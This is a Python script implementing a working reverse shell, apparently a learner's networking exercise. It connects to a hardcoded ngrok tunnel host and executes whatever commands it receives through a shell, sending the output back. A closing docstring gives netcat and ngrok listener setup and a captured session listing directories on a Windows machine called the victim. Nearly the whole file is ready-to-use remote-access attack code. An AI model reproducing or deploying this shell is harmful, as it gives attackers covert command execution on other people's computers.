import socket
import subprocess
import os
import sys
import threading

def change_current_dir(new_path):
    try:
        if new_path:
            os.chdir(new_path.strip())
        else:
            os.chdir('..')
    except Exception as e:
        print(f"Error changing directory: {e}")

"""
Reverse shell: The target machine connects back to the attacker's machine,
which is listening on an open port for incoming connections.
"""

ATTACKER_IP = "0.tcp.in.ngrok.io"  # Change this to your attacker's IP address
ATTACKER_PORT = 13253              # Change the port if necessary

def main():
    sock = None
    try:
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the attacker's machine
        sock.connect((ATTACKER_IP, ATTACKER_PORT))

        # Send a message indicating successful connection
        sock.send(b'[*] Connection Established\n')

        # Start an interactive shell
        while True:
            # Receive command from the attacker
            data = sock.recv(1024)
            if not data:
                break

            command = data.decode('utf-8').strip()
            if command.startswith("cd"):
                # Handle 'cd' command
                path = command[3:].strip()
                change_current_dir(path)
            else:
                # Execute the command and send the output back to the attacker
                cmd_output = subprocess.run(command, shell=True, capture_output=True, text=True)
                sock.sendall(cmd_output.stdout.encode('utf-8') + cmd_output.stderr.encode('utf-8'))

    except Exception as e:
        print(f"Connection failed: {e}")

    finally:
        if sock:
            sock.close()  # Ensure socket is closed after execution

if __name__ == "__main__":
    main()


'''
A windows based reverse_shell
Victim windows
Attacker kali machine
N/B: The machines were not onthe same network turnel traffic through ngrok
i.e install ngrok and get code by signing to there web site
to start pick the port your listening to
    kali> nc -lvnp 8080 
Start ngrok:
    kali>ngrok tcp 8080
Output
                                                                                   
Session Status                online                                            
Account                       Allan (Plan: Free)                                
Version                       3.19.1                                            
Region                        India (in)                                        
Latency                       238ms                                             
Web Interface                 http://127.0.0.1:4040                             
Forwarding                    tcp://0.tcp.in.ngrok.io:13253 -> localhost:8080   
                                                                                
Connections                   ttl     opn     rt1     rt5     p50     p90       
                              14      0       0.00    0.00    11.57   189.00    
                                                                                


When we run the payload we can control the compromised machine
──(root㉿kali)-[/home/kali]
└─# nc -lvnp 8080 -s 0.0.0.0

listening on [any] 8080 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43872
[*] Connection Established
whoami
desktop-lsf7uhq//user
dir
 Volume in drive J is New Volume
 Volume Serial Number is 1A52-467D

 Directory of J://code//python code//Mastering Python networking//Network

02/19/2025  01:11 AM    <DIR>          .
02/19/2025  01:11 AM    <DIR>          ..
02/19/2025  12:35 AM             2,170 advanced_port_scanner.py
02/19/2025  01:02 AM             1,338 reverse_shell.py
02/18/2025  11:59 PM             1,162 service_names.py
02/18/2025  11:43 PM             1,529 socket_methods.py
02/18/2025  07:12 PM               775 socket_open_ports.py
02/18/2025  07:31 PM             1,505 socket_web_server.py
02/19/2025  01:42 AM             1,886 windows_reverse_shell.py
               7 File(s)         10,365 bytes
               2 Dir(s)  15,902,068,736 bytes free
cd ..
dir
 Volume in drive J is New Volume
 Volume Serial Number is 1A52-467D

 Directory of J://code//python code//Mastering Python networking

02/18/2025  06:58 PM    <DIR>          .
02/18/2025  06:58 PM    <DIR>          ..
02/17/2025  12:55 PM                 0  message.txt
02/17/2025  02:09 PM    <DIR>          allan
02/16/2025  05:36 PM    <DIR>          Basics python
02/17/2025  12:16 PM    <DIR>          change_me
02/17/2025  08:01 PM            13,180 Mastering Python.docx
02/19/2025  01:11 AM    <DIR>          Network
02/17/2025  07:31 PM    <DIR>          System Programming
               2 File(s)         13,180 bytes
               7 Dir(s)  15,902,068,736 bytes free
cd System Programming
dir
 Volume in drive J is New Volume
 Volume Serial Number is 1A52-467D

 Directory of J://code/python code/Mastering Python networking/System Programming

02/17/2025  07:31 PM    <DIR>          .
02/17/2025  07:31 PM    <DIR>          ..
02/17/2025  01:04 PM                 0  delete_me.txt
02/17/2025  11:28 AM               408 check_file.py
02/19/2025  12:16 AM             1,907 execute_shell.py
02/17/2025  05:10 PM               393 file_stats.py
02/17/2025  02:45 PM                21 hello.py
02/17/2025  01:46 PM    <DIR>          here me
02/17/2025  02:42 PM                13 message.txt
02/17/2025  07:50 PM             1,046 multiprocess_nums.py
02/18/2025  11:15 PM               546 show_content_directory.py
02/17/2025  06:05 PM               252 subprocess_nmap.py
02/17/2025  06:16 PM               391 subprocess_program_checker.py
02/17/2025  06:38 PM               453 threading_init.py
02/17/2025  07:12 PM               540 thread_join.py
              12 File(s)          5,970 bytes
               3 Dir(s)  15,902,068,736 bytes free
